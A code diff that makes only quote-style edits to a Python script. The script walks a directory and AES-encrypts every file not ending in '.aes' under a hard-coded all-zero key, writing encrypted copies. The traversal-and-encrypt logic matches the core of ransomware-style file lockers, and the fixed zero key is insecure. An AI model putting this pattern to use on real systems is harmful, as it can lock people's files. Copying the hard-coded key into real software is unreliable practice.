@@ -3,7 +3,7 @@ from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
 
-key = b"0000000000000000"
+key = b'0000000000000000'
 
 def traverse(root_dir):
   print('traversing: ' + root_dir)
@@ -17,7 +17,7 @@ def traverse(root_dir):
 
       if (filename_split[1] != '.aes'):
 
-        plain_file = open(filepath, "rb")
+        plain_file = open(filepath, 'rb')
         plain_data = plain_file.read()
         plain_file.close()
 
@@ -29,7 +29,7 @@ def traverse(root_dir):
 
         out_filename = filepath + '.aes'
 
-        with open(f"{out_filename}", "wb") as encrypted_file:
+        with open(f'{out_filename}', 'wb') as encrypted_file:
           encrypted_file.write(cipher.nonce)
           encrypted_file.write(tag)
           encrypted_file.write(ciphertext)
